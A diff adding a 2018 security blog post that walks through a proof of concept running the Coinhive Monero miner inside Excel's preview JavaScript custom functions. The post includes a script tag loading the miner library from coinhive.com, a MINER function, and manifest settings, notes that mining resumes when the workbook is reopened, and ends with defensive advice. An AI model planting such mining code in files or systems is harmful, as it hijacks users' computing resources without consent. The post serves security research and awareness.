@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>JavaScript Coinhive in Excel</title>
+    <meta name="description" content="Proof-of-concept walkthrough for running Coinhive cryptocurrency mining within Excel's new JavaScript custom functions." />
+    <link rel="stylesheet" href="../assets/css/blog.css" />
+  </head>
+  <body>
+    <header class="masthead">
+      <div class="masthead__inner">
+        <div class="brand">
+          <a class="brand__link" href="../index.html">Charles Dardaman</a>
+          <p class="brand__tagline">Security engineering, incident response, research.</p>
+        </div>
+        <nav class="site-nav" aria-label="Primary">
+          <ul>
+            <li><a href="../index.html#about">About</a></li>
+            <li><a href="../index.html#writing">Writing</a></li>
+            <li><a href="../index.html#connect">Connect</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <header class="post-header">
+      <h1>JavaScript Coinhive in Excel</h1>
+      <p><time datetime="2018-05-08">May 8, 2018</time></p>
+    </header>
+
+    <main>
+      <article>
+        <h2>Timeline</h2>
+        <p>
+          This morning, I read that Microsoft announced that they have added JavaScript functions into the insiders preview build of Excel.
+        </p>
+        <p>
+          <a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-adds-support-for-javascript-functions-in-excel/" target="_blank" rel="noopener">
+            https://www.bleepingcomputer.com/news/microsoft/microsoft-adds-support-for-javascript-functions-in-excel/
+          </a>
+        </p>
+        <p>
+          Like most of you reading this, I couldn't wait for a proof of concept of coin mining within Excel using the new JavaScript functions.
+        </p>
+        <blockquote class="twitter-tweet">
+          <p lang="en" dir="ltr">I cannot wait for the first cryptocurrency miner in Excel</p>&mdash; Charles Dardaman (@CharlesDardaman) <a href="https://twitter.com/CharlesDardaman/status/993874412486176768?ref_src=twsrc%5Etfw">May 8, 2018</a>
+        </blockquote>
+        <p>
+          I even went as far as to offer a small bounty to anyone at Dallas Hackers who could build and present on it at next month's meetup.
+        </p>
+        <blockquote class="twitter-tweet">
+          <p lang="en" dir="ltr">I&#39;ll buy a beer to whoever presents cryptocurrency mining in Excel at the next <a href="https://twitter.com/Dallas_Hackers?ref_src=twsrc%5Etfw">@Dallas_Hackers</a></p>&mdash; Charles Dardaman (@CharlesDardaman) <a href="https://twitter.com/CharlesDardaman/status/993877218270105601?ref_src=twsrc%5Etfw">May 8, 2018</a>
+        </blockquote>
+        <p>
+          After making this offer, I started to read Microsoft's actual documentation on how to implement JavaScript within Excel, and decided I could do this myself. I then signed up for an account on coinhive.com and started to download the preview build of Excel for macOS. After over an hour of downloading the preview on my 5&nbsp;Mbps internet, I was able to get my hands on it and get Coinhive running within the newest preview build of Excel.
+        </p>
+        <blockquote class="twitter-tweet">
+          <p lang="en" dir="ltr">GOT IT! <a href="https://twitter.com/hashtag/coinhive?src=hash&amp;ref_src=twsrc%5Etfw">#coinhive</a> <a href="https://twitter.com/hashtag/Excel?src=hash&amp;ref_src=twsrc%5Etfw">#Excel</a> <a href="https://twitter.com/hashtag/Microsoft?src=hash&amp;ref_src=twsrc%5Etfw">#Microsoft</a> <a href="https://twitter.com/hashtag/Malware?src=hash&amp;ref_src=twsrc%5Etfw">#Malware</a> <a href="https://t.co/QvHkgnGFkQ">pic.twitter.com/QvHkgnGFkQ</a></p>&mdash; Charles Dardaman (@CharlesDardaman) <a href="https://twitter.com/CharlesDardaman/status/993912675804614657?ref_src=twsrc%5Etfw">May 8, 2018</a>
+        </blockquote>
+
+        <h2>Proof of Concept</h2>
+        <p>
+          In order to run Coinhive in Excel, I followed Microsoft's official documentation and just added my own function. There are three steps that Microsoft lists in order to get JavaScript running:
+        </p>
+        <ol>
+          <li>
+            Install Office (build 9325 on Windows or 13.329 on Mac) and join the Office Insider program. (Note that it isn't enough just to get the latest build; the feature will be disabled on any build until you join the Insider program.)
+          </li>
+          <li>
+            Clone the Excel-Custom-Functions repo and follow the instructions in the README.md to start the add-in in Excel, make changes in the code, and debug.
+          </li>
+          <li>
+            Type <code>=CONTOSO.ADD42(1,2)</code> into any cell, and press Enter to run the custom function.
+          </li>
+        </ol>
+        <p>
+          <a href="https://docs.microsoft.com/en-us/office/dev/add-ins/excel/custom-functions-overview" target="_blank" rel="noopener">Microsoft's documentation</a> covers the steps in detail. The first step is easy: select the Insider program from the update menu for Microsoft Office and allow it to update. This gives Excel the ability to run JavaScript functions.
+        </p>
+        <figure>
+          <img src="../assets/js_coinhive_in_excel/1.png" alt="Screenshot showing Excel Insider build update screen" />
+        </figure>
+        <p>
+          Step two is where the magic happens. Head to Microsoft's GitHub and download the four important files:
+        </p>
+        <ul>
+          <li>customfunctions.html</li>
+          <li>customfunctions.js</li>
+          <li>customfunctions.json</li>
+          <li>customfunctions.xml</li>
+        </ul>
+        <p>
+          Once you have these files, you need to make a couple of edits in order to add in the Coinhive features and code from their documentation. For the HTML file, add the following no-auth script tag into the head so that Coinhive can be called later:
+        </p>
+        <pre><code>&lt;script src="https://coinhive.com/lib/coinhive.min.js"&gt;&lt;/script&gt;
+</code></pre>
+        <p>
+          For the JavaScript file, add in the following function which will then be called from within the Excel cell:
+        </p>
+        <pre><code>function MINER(){
+    var miner = new CoinHive.Anonymous('Your Public Coinhive Key goes here.', {throttle: 0.7});
+
+    if (!miner.isMobile() &amp;&amp; !miner.didOptOut(14400)) {
+        miner.start();
+    }
+}
+</code></pre>
+        <p>
+          In the JSON file, add data about the new <code>MINER</code> function so that Excel can load it.
+        </p>
+        <pre><code>{
+    "name": "MINER",
+    "description": "MINER MINER",
+    "helpUrl": "http://dev.office.com",
+    "result": {
+        "type": "number",
+        "dimensionality": "scalar"
+    },
+    "parameters": [],
+    "options": {
+        "sync": false
+    }
+}
+</code></pre>
+        <p>
+          After editing these three files, you must host them on a web server. I hosted them on a Linux VM running Apache so that I could easily hit the files locally.
+        </p>
+        <p>
+          Lastly, edit the XML file by adding in the web server IP address.
+        </p>
+        <pre><code>&lt;SourceLocation DefaultValue="http://192.168.201.140/customfunctions.html"/&gt;
+...
+&lt;bt:Urls&gt;
+    &lt;bt:Url id="JSON-URL" DefaultValue="http://192.168.201.140/customfunctions.json" /&gt;
+    &lt;bt:Url id="JS-URL" DefaultValue="http://192.168.201.140/customfunctions.js" /&gt;
+    &lt;bt:Url id="HTML-URL" DefaultValue="http://192.168.201.140/customfunctions.html" /&gt;
+&lt;/bt:Urls&gt;
+</code></pre>
+        <p>
+          This XML file is the manifest file that must currently be added into Excel for JavaScript to work. I assume this will change by the time JavaScript becomes fully supported in Excel, as most users will not be savvy enough to add in the functionality themselves. On macOS, I followed instructions on Microsoft's blog, which basically tell you to copy the XML file into the following location:
+        </p>
+        <pre><code>/Users/&lt;username&gt;/Library/Containers/com.microsoft.Excel/Data/documents/wef/
+</code></pre>
+        <p>
+          With all of these files in place and hosted, you're ready for step three. Open a new workbook in Excel and click <em>Insert → My Add-ins</em>; you should now see that your new functions have been added.
+        </p>
+        <figure>
+          <img src="../assets/js_coinhive_in_excel/2.png" alt="Excel custom function add-in showing new functions" />
+        </figure>
+        <p>
+          Now, simply type the following into any cell on the sheet and hit enter:
+        </p>
+        <pre><code>=CONTOSO.MINER()
+</code></pre>
+        <p>
+          Your PC will now be mining Monero for you. This code does have persistence; if you save the XLSX sheet now and reopen it, your PC will instantly start to mine again without any user interaction.
+        </p>
+
+        <h2>Summary</h2>
+        <p>
+          Microsoft has, for some reason, decided that the business world needs yet another scripting language running within Office. Currently, it takes some effort to get JavaScript running within Excel, but I suspect that the difficulty will drop drastically as we near full support. Once that happens, I plan to take another look at this new attack vector.
+        </p>
+        <p>
+          If you are a blue-teamer, like me, wondering how to defend against such an attack, try to get in front of your IT team and have JavaScript disabled whenever it hits the full Office build. We do not currently know what controls Microsoft will put around JavaScript use, but it will probably be better to block it before your company becomes dependent on it.
+        </p>
+        <p>
+          If you have any questions regarding this proof of concept please reach out on Twitter. I'm happy to answer questions.
+        </p>
+      </article>
+      <div class="footer">
+        <a href="../index.html">← Back to homepage</a>
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <p>&copy; <span id="current-year"></span> Charles Dardaman</p>
+    </footer>
+
+    <script>
+      const year = new Date().getFullYear();
+      document.getElementById("current-year").textContent = year;
+    </script>
+  </body>
+</html>
